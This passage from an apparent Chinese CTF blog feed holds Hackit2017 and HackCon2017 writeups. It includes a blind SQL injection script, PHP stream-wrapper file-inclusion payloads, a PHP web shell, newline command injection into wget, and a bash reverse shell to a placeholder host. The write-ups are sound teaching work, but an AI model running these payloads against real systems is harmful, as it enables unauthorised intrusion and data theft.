<p>得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FEELREALHACKER</div></pre></td></tr></table></figure></p>
<p>再把它转成小写，flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">h4ck1t&#123;feelrealhacker&#125;</div></pre></td></tr></table></figure></p>
<h1 id="tucao"><a href="#tucao" class="headerlink" title="tucao"></a>tucao</h1><p>这是脑洞题？…</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hackit2017-Weekands of hacker-writeup&lt;br&gt;脑脑脑洞题？&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-V1rus3pidem1c-writeup</title>
    <link href="http://yoursite.com/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/"/>
    <id>http://yoursite.com/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/</id>
    <published>2017-08-28T07:42:03.000Z</published>
    <updated>2017-08-28T11:10:06.334Z</updated>
    
    <content type="html"><![CDATA[<p>Hackit2017-V1rus3pidem1c-writeup<br>sql注入<br>php伪协议：php://filter，zip://，phar://<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Description: Hackers created an automated site for virus attacks on the Government. You must find and catch them all!</div><div class="line"></div><div class="line">Attachment: (none)</div><div class="line"></div><div class="line">Webpage: http://tasks.ctf.com.ua:13372</div><div class="line"></div><div class="line">Hint: (none)</div></pre></td></tr></table></figure>
<p>先看看基本的功能，你可以选择对应的国家，然后上传你的virus，但题目没有返回上传后的保存的文件路径信息。</p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>点一下send，会发现url变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=Germany</div></pre></td></tr></table></figure></p>
<p>对于get参数，首先想的一般是sql注入；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://tasks.ctf.com.ua:13372/index.php?country=Germany</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/11.png?raw=true" alt=""></p>
<p>接下去用下面的脚本注出数据：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</div><div class="line">	url = <span class="string">"http://tasks.ctf.com.ua:13372/index.php?country="</span> + payload</div><div class="line">	<span class="comment"># headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125;</span></div><div class="line">	content = requests.get(url,proxies=proxy)</div><div class="line">	<span class="keyword">return</span> content.text</div><div class="line">flag = <span class="string">"Select virus for Germany"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateTarget</span><span class="params">(flag)</span>:</span></div><div class="line">	<span class="keyword">if</span> flag == <span class="string">"database"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"database()"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"tables"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x57484154415245594f55444f494e4748455245)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"columns"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x636f756e7472696573)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"data"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(countryID,0x3a,countryName,0x3a,scriptPath%09SEPARATOR%090x3c62723e)%09FROM%09countries)"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,target)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		payload = <span class="string">"' or (select ascii(substr("</span> +generateTarget(target) + <span class="string">" from "</span>+ str(i) +<span class="string">" for 1))&lt;= "</span>+str(midNum) +<span class="string">" )%23"</span></div><div class="line">		<span class="comment"># print payload</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="comment"># print recv</span></div><div class="line">		<span class="keyword">if</span> flag <span class="keyword">in</span> recv:</div><div class="line">			<span class="comment"># print 'cuowu'</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			doubleSearch(leftNum,midNum,i,target)</div><div class="line"></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="comment"># print 'chenggong'</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line"></div><div class="line">			doubleSearch(midNum,rightNum,i,target)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			<span class="comment"># print rightNum</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The database:"</span></div><div class="line">	target = <span class="string">"database"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The tables:"</span></div><div class="line">	target = <span class="string">"tables"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The columns:"</span></div><div class="line">	target = <span class="string">"columns"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The data:"</span></div><div class="line">	target = <span class="string">"data"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
<p>得到数据库WHATAREYOUDOINGHERE中countries表中的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">countryID:countryName:scriptPath</div><div class="line">1:Germany:country/ge.php</div><div class="line">2:Turkmenistan:country/tu.php</div><div class="line">3:Netherlands:country/ne.php</div><div class="line">4:Serbia:country/se.php</div><div class="line">5:Turkey:country/tk.php</div><div class="line">6:France:country/fr.php</div><div class="line">7:UK:country/uk.php</div><div class="line">8:Russia:country/ru.php</div><div class="line">9:USA:country/us.php</div><div class="line">10:Canada:country/ca.php</div></pre></td></tr></table></figure></p>
<h2 id="读取源码"><a href="#读取源码" class="headerlink" title="读取源码"></a>读取源码</h2><p>接下来看看还能做啥。初步尝试发现应该是只有1列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=Germany&apos; union select 1 -- -</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/12.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=Germany&apos; union select 1,2 -- -</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/13.png?raw=true" alt=""></p>
<p>尝试使用php伪协议：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;php://filter/read=convert.base64-encode/resource=index.php&apos; -- -</div></pre></td></tr></table></figure></p>
<p>base64解码一下，其中有段code：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'country'</span>]))&#123;</div><div class="line"></div><div class="line">			$link = mysqli_connect(<span class="string">"127.0.0.1"</span>, <span class="string">"beeber"</span>, <span class="string">"eouejvnbinrwviewrJNHUFEjnkwfowe"</span>, <span class="string">"WHATAREYOUDOINGHERE"</span>);</div><div class="line"></div><div class="line">			$result = mysqli_query($link, <span class="string">"SELECT scriptPath FROM countries WHERE countryName='"</span>.$_GET[<span class="string">'country'</span>].<span class="string">"';"</span>);</div><div class="line">			$res_include = $result-&gt;fetch_object()-&gt;scriptPath;</div><div class="line">			<span class="comment">//echo 'Get file: '.$res_include.'&lt;br&gt;&lt;br&gt;';</span></div><div class="line"></div><div class="line">			<span class="keyword">include</span> $res_include;</div><div class="line"></div><div class="line"></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>include哪一个页面是根据从数据库中取出的脚本的路径决定的。根据我们前面利用脚本注出来的结果，我们看看country/ge.php中的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">	$target_dir = <span class="string">"uploads/"</span>;</div><div class="line">	$target_file = $target_dir . basename($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</div><div class="line">	move_uploaded_file($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"tmp_name"</span>], $target_file);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>从country/ge.php源码中，我们知道了文件上传后保存在uploads文件夹下，文件名也没有改变。</p>
<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><h3 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h3><p>直接上传php文件再去访问uploads下的文件是无法解析的。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/14.png?raw=true" alt=""></p>
<p>可以利用zip协议或者phar协议来进行文件包含。</p>
<p>chybeta.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	system(<span class="string">'ls'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>打包成chybeta.zip，上传后访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;zip://uploads/chybeta.zip%23chybeta.php&apos; -- -</div></pre></td></tr></table></figure></p>
<p>或者访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;phar://uploads/chybeta.zip/chybeta.php&apos; -- -</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/15.png?raw=true" alt=""></p>
<p>接下去我们利用php伪协议读取iulersiueruigfuihseruhgi.php的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;php://filter/read=convert.base64-encode/resource=iulersiueruigfuihseruhgi.php</div></pre></td></tr></table></figure></p>
<p>解码后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">h4ck1t&#123;$QL&amp;LFI=FR13ND$&#125;</div></pre></td></tr></table></figure></p>
<h3 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h3><p>chybeta.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	system($_GET[<span class="string">'chybeta'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>上传后可以直接访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?chybeta=ls&amp;country=&apos; union select &apos;uploads/chybeta.php&apos; -- -</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/16.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">view-source:http://tasks.ctf.com.ua:13372/index.php?chybeta=cat iulersiueruigfuihseruhgi.php&amp;country=&apos; union select &apos;uploads/chybeta.php&apos; -- -</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/17.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hackit2017-V1rus3pidem1c-writeup&lt;br&gt;sql注入&lt;br&gt;php伪协议：php://filter，zip://，phar://&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-B3tterS0ci4lN3twork-writeup</title>
    <link href="http://yoursite.com/2017/08/28/Hackit2017-B3tterS0ci4lN3twork-writeup/"/>
    <id>http://yoursite.com/2017/08/28/Hackit2017-B3tterS0ci4lN3twork-writeup/</id>
    <published>2017-08-27T23:51:05.000Z</published>
    <updated>2017-08-28T10:52:19.176Z</updated>
    
    <content type="html"><![CDATA[<p>Hackit2017-B3tterS0ci4lN3twork-writeup<br>命令注入<br>wget-cve利用<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: You know what to do!</div><div class="line">Attachment: (none)</div><div class="line">Webpage: http://tasks.ctf.com.ua:13374</div><div class="line">Hint: Try to find some known cves) Hide</div></pre></td></tr></table></figure>
<p>有一个注册Register功能，和登陆Auth功能。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/1.png?raw=true" alt=""></p>
<p>在注册完成并登录后，会跳到profile.php页面：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/2.png?raw=true" alt=""></p>
<p>右上角有Send Message和Get Message功能。我们试着写一条信息发送给自己：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/3.png?raw=true" alt=""></p>
<p>然后到Get Message功能处，发现是存在XSS漏洞的。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/4.png?raw=true" alt=""></p>
<p>但经过一番测试，这里没办法进一步的利用。回到profile.php。这里有两个功能，一个是修改密码，另一个是根据你填入的图片地址获得Your avatar。</p>
<p>这里我们填上一张放在自己服务器上的图片</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/5.png?raw=true" alt=""></p>
<p>提交后用burp看一下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/6.png?raw=true" alt=""></p>
<p>查看服务器log，发现是wget/1.15：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/7.png?raw=true" alt=""></p>
<p>所以服务器端应该是用wget 我们填入图片的地址，然后保存到avatars/yourhost/xx.jpg。而且只允许jpg/png/gif。若是php文件，在被wget完成后检测后会被删除。</p>
<h1 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h1><p>从上面的图片来看，假设后端的wget语句(约莫)如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget  -r -P avatars  -A &apos;*.jpg,*.png,*.gif&apos;  $url</div></pre></td></tr></table></figure></p>
<p>而$url是我们可以控制的，那可以尝试注入比如换行符，比如令<code>$URL=http://xx.com/a.jpg\nwhoami</code>，让后端执行时变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget  -r -P avatars  -A &apos;*.jpg,*.png,*.gif&apos; http://xx.com/a.jpg</div><div class="line">whoami</div></pre></td></tr></table></figure></p>
<p>从而导致命令注入。经过fuzz，换行符<code>\n</code>没有过滤，制表符<code>\t</code>没有过滤可用来代替空格。</p>
<p>我们在自己的服务器上放一个jpg文件，之所以用jpg做后缀是因为在wget完后，wget命令会检测指定后缀名，若不是，则会删掉。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/9.png?raw=true" alt=""></p>
<p>其内容是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/bash -i &gt; /dev/tcp/yourhost/port 0&lt;&amp;1 2&gt;&amp;1</div></pre></td></tr></table></figure></p>
<p>服务器端将使用wget将图片下载到 avatars/yourhost/xx.jpg 的位置，然后我们再利用bash去加载avatars/yourhost/xx.jpg来获得一个shell。最后的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">cookie = &#123;<span class="string">"PHPSESSID"</span>:<span class="string">"uchf0tsmo9fnpvgjllo67kr9k1"</span>&#125;</div><div class="line"></div><div class="line">payload = <span class="string">"http://yourhost/chybeta.jpg\nbash\tavatars/yourhost/chybeta.jpg"</span></div><div class="line"></div><div class="line">url = <span class="string">"http://tasks.ctf.com.ua:13374/profile.php"</span></div><div class="line"></div><div class="line">data = &#123;<span class="string">"password"</span>:<span class="string">""</span>,<span class="string">"new_password"</span>:<span class="string">""</span>,<span class="string">"avatar_url"</span>:payload&#125;</div><div class="line"></div><div class="line">requests.post(url,cookies=cookie,data=data)</div></pre></td></tr></table></figure>
<p>然后在自己的服务器上监听端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -vv -l -p 24853</div></pre></td></tr></table></figure></p>
<p>运行python脚本，得到shell。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/10.png?raw=true" alt=""></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">h4ck1t&#123;h4ck1t&#123;wg3t_cv3_1n_CTF&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h1><p>wget的版本是1.15，这个在pwnhub-another-php中出现过，利用<a href="https://www.cvedetails.com/cve/CVE-2016-7098/" target="_blank" rel="external">CVE-2016-7098</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Race condition in wget 1.17 and earlier, when used in recursive or mirroring mode to download a single file, might allow remote servers to bypass intended access list restrictions by keeping an HTTP connection open.</div></pre></td></tr></table></figure></p>
<p>参考文章：<a href="https://legalhackers.com/advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html" target="_blank" rel="external">Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098</a></p>
<p>也就是说利用竞争条件，在wget的链接还没结束前，它对后缀名的检测就不会触发，这样赶在这段时间内服务器wget后的webshell其实是存在的。</p>
<p>但我没成功。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hackit2017-B3tterS0ci4lN3twork-writeup&lt;br&gt;命令注入&lt;br&gt;wget-cve利用&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>HackCon2017-Steg-writeup</title>
    <link href="http://yoursite.com/2017/08/27/HackCon2017-Steg-writeup/"/>
    <id>http://yoursite.com/2017/08/27/HackCon2017-Steg-writeup/</id>
    <published>2017-08-27T02:04:53.000Z</published>
    <updated>2017-08-29T08:44:06.476Z</updated>
    
    <content type="html"><![CDATA[<p>HackCon2017-Steg-writeup<br><a id="more"></a></p>
<h1 id="Standard-Steg"><a href="#Standard-Steg" class="headerlink" title="Standard Steg"></a>Standard Steg</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">I hacked my friend&apos;s facebook, by seeing his chrome password. I am smart, right?</div><div class="line">Anyways, he sent this image to one of his friends, idk what it is, looks like a useless logo, can you check?</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">asciiToBin</span><span class="params">(ascii)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">''</span>.join(str(bin(ord(byte)))[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> ascii)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hide</span><span class="params">(img, data, outName)</span>:</span></div><div class="line">	header, trailer = <span class="number">2</span>*<span class="string">"11001100"</span>,<span class="number">2</span>*<span class="string">"0101010100000000"</span></div><div class="line">	dataBin = header+asciiToBin(data)+trailer</div><div class="line">	pixels, mode = list(img.getdata()), img.mode</div><div class="line">	newPixels = []</div><div class="line"></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(dataBin)):</div><div class="line">		newPixel = list(pixels[i])</div><div class="line">		newPixel[i%len(mode)] = setLSB(newPixel[i%len(mode)], dataBin[i])</div><div class="line">		newPixels.append(tuple(newPixel))</div><div class="line"></div><div class="line">	newData = newPixels + pixels[len(newPixels):]</div><div class="line"></div><div class="line">	img.putdata(newData)</div><div class="line">	img.save(outName, <span class="string">"PNG"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">setLSB</span><span class="params">(target, value)</span>:</span></div><div class="line">	binary = str(bin(target))[<span class="number">2</span>:]</div><div class="line">	<span class="keyword">if</span> binary[<span class="number">-1</span>] != value:</div><div class="line">		binary = binary[:<span class="number">-1</span>] + value</div><div class="line">	<span class="keyword">return</span> int(binary, <span class="number">2</span>)</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HackCon2017-Steg-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="steg" scheme="http://yoursite.com/tags/steg/"/>
    
  </entry>
  
  <entry>
    <title>HackCon2017-Web-writeup</title>
    <link href="http://yoursite.com/2017/08/27/HackCon2017-Web-writeup/"/>
    <id>http://yoursite.com/2017/08/27/HackCon2017-Web-writeup/</id>
    <published>2017-08-27T00:35:47.000Z</published>
    <updated>2017-08-29T01:41:05.740Z</updated>
    
    <content type="html"><![CDATA[<p>HackCon2017-Web-writeup<br><a id="more"></a></p>
